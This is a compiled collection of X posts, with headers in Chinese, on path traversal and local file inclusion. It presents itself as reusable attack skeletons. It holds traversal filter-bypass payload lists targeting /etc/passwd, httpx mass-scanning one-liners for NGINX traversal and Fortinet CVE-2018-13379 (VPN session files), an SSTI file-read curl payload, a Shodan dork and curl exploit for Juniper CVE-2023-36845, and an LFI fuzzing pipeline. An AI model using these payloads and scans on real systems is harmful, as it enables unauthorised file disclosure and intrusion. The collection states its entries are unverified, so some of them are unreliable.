# X 语料 · 残余回收（路径穿越与文件读取）

来源：X 公开贴子，含可直接套用的骨架（命令行 / 载荷 / 请求头 / 绕过变体）。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[路径与包含](../by-type/lfi-path-traversal.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-file-1（79 条）、x-exp-file（14 条）、x-residual-upload（1 条） · 本文 45 行

- Wildcard bypass & LFI
  1. Intercepted a POST req that pointed to a local file "/usr/local/redacted/filename"
  2. tried "/etc/passwd" -> bad request
  3. "/user/local/../../etc/passwd" -> bad request
  4. "/user/local/redacted/../../../etc/passwd" -> OK
- GET /page.php?path=../../etc/passwd
  Forbidden 403 ?
  Try One Of These:
  (1)../../../etc/passwd%00
  (2)....//....//....//etc/passwd
  (3)%252e%252e%252fetc%252fpasswd
- path traversal filter bypass payload list:
  -> ../../../etc/passwd
  -> /etc/passwd
  -> ...//....//....//etc/passwd
  -> %252f..%252f..%252fetc/passwd
  -> /var/www/images/../../../etc/passwd
  -> ../../../etc/passwd%00.png
- One Liner to Find NGINX Path Traversal
  httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
- A path traversal vulnerability in the FortiOS SSL VPN web portal CVE-2018-13379
  httpx -l ips.txt -path "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession" -status-code -mc 200
- SSTI to RCE:
  curl -X POST http://test.com:8080 -H "Cookie: token=eyJhbGciOiJI5cCI6Ikp.eyJ1c2VybmFtZSI6IndpemFyZC5vn0.YuW5qoU_-3FQ6q5wyFPw3PFlDHDOjuu2k" --data "name=name&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
- Config parameter on login request held the path:
- Testing CVE-2023-36845
  Juniper Networks Vulnerability - RCE Exploit & Protection
  PoC:
  1-Shodan search:
  title:"Juniper" http.favicon.hash:2141724739
  2-Exploit with Curl
  curl <TARGET> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
- Directory Traversal Bypass Payload
  /../../etc/passwd - 403 Forbidden
  %252f%252e%252e%252f%252e%252e%252fetc%252fpasswd - 200 OK
  Access Oneliners from Github: https://github.com/thecybertix/One-Liner-Collections
- One-liner to find LFI
  echo http://site.com | gau | urldedupe -qs | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payloads/lfi.txt -c -mr "root:" -v; done
